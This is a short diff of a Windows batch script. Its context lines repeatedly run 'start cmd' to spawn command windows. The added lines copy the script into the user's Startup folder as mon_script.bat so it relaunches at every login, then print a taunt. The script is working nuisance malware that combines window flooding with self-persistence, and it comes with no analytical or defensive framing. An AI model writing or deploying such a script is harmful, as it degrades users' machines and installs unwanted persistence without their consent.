@@ -137,3 +137,9 @@ start cmd
 start cmd
 start cmd
 start cmd
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+copy "%~f0" "%startup%\mon_script.bat" /Y
+
+echo vive la kz 
+pause
